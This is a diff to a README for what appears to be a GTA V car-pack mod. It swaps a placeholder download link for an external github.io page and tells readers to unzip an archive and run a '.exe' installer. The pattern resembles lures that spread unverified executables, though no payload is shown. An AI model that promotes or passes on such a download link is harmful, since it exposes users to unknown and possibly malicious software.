@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start automatic installation into your GTA V directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mega-realistic-carpack-gta5.github.io/.github/)
 
 ## 📸 Overview
 ![gta5-realistic-carpack-models](https://github.com/user-attachments/assets/15bf8ee9-24b5-4ef9-9a7e-41ea97200068)
